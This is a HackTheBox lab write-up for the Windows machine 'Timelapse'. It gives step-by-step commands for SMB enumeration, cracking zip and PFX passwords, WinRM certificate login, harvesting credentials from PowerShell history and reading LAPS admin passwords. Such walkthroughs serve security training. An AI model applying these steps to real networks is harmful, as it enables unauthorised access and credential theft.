---
title: "HTB — Timelapse Writeup"
date: 2026-05-23 00:00:00 +0000
categories: [HackTheBox, Writeup]
tags: [windows, active-directory, winrm, laps, certificate, privilege-escalation]
image: /assets/img/box/22/logo.png
---

**Machine:** Timelapse  
**OS:** Windows  
**Difficulty:** Easy  

## Enumeration

### Nmap Scan

```bash
sudo nmap -sC -sV 10.129.227.113
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
5986/tcp open  ssl/wsmans?
```

Key findings:

- Domain: `timelapse.htb`
- Port `5986` — WinRM over SSL is open
- Port `389/3268` — LDAP (Active Directory)

---

### SMB Enumeration

```bash
smbclient -L \\10.129.227.113 -N
```

Found a non-default share called `Shares`. Connecting anonymously:

```bash
smbclient.py -no-pass anonymous@10.129.227.113
```

Inside the `Dev` folder:

```
Dev/
└── winrm_backup.zip
```

Downloaded `winrm_backup.zip` for further analysis.

---

## Foothold

### Cracking the ZIP Password

The ZIP is password protected. Extract the hash and crack it:

```bash
zip2john winrm_backup.zip > zip.hash
john zip.hash --wordlist=../../rockyou.txt
```

**Password:** `supremelegacy`

After unzipping, we get: `legacyy_dev_auth.pfx`

---

### Cracking the PFX Password

The PFX file is also password protected. Extract the hash:

```bash
pfx2john.py legacyy_dev_auth.pfx > hash.txt
john hash.txt --wordlist=../../rockyou.txt
```

**Password:** `thuglegacy`

---

### Extracting Certificate and Key

```bash
# Extract private key
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out key.pem
# Enter password: thuglegacy

# Extract certificate
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
# Enter password: thuglegacy
```

---

### WinRM Authentication via Certificate

```bash
ewp -i 10.129.227.113 --cert-pem legacyy_dev_auth.crt --priv-key-pem key.pem --ssl
```

```
evil-winrm-py PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
```

Shell obtained as `legacyy` ✅

---

## User Flag

```powershell
type C:\Users\legacyy\Desktop\user.txt
```

---

## Privilege Escalation

### PowerShell History Leak

One of the first things to check on Windows machines is the PowerShell command history file:

```powershell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Output reveals hardcoded credentials:

```powershell
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
```

**Credentials found:**

- Username: `svc_deploy`
- Password: `E3R$Q62^12p7PLlC%KWaxuaV`

---

### Lateral Movement to svc_deploy

```bash
ewp -i 10.129.227.113 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --ssl
```

Checking privileges:

```powershell
whoami /all
```

Key finding in group memberships:

```
TIMELAPSE\LAPS_Readers    Group    Mandatory group, Enabled by default, Enabled group
```

`svc_deploy` is a member of **`LAPS_Readers`** — a group with permission to read LAPS (Local Administrator Password Solution) passwords from Active Directory.

---

### Reading the LAPS Password

LAPS stores the local Administrator password in the AD attribute `ms-Mcs-AdmPwd`. Since `svc_deploy` is in `LAPS_Readers`, we can read it using PowerView:

```powershell
Get-DomainComputer -Properties Name, ms-Mcs-AdmPwd | Select Name, ms-Mcs-AdmPwd
```

```
Name   ms-Mcs-AdmPwd
----   -------------
DC01   MK8L;n44dQ01--G;}I0@0fHN
DB01
WEB01
DEV01
```

**Administrator password for DC01:** `MK8L;n44dQ01--G;}I0@0fHN`

---

### Login as Administrator

```bash
ewp -i 10.129.227.113 -u Administrator -p 'MK8L;n44dQ01--G;}I0@0fHN' --ssl
```

```
evil-winrm-py PS C:\Users\Administrator\Documents> whoami
timelapse\administrator
```

Full admin access obtained ✅

---

## Root Flag

The root flag is not on the Administrator desktop — search recursively:

```powershell
Get-ChildItem -Path C:\Users -Recurse -Filter "root.txt" -ErrorAction SilentlyContinue
```

```
Directory: C:\Users\TRX\Desktop

Mode    LastWriteTime    Length  Name
----    -------------    ------  ----
-ar---  5/23/2026        34      root.txt
```

```powershell
type C:\Users\TRX\Desktop\root.txt
```
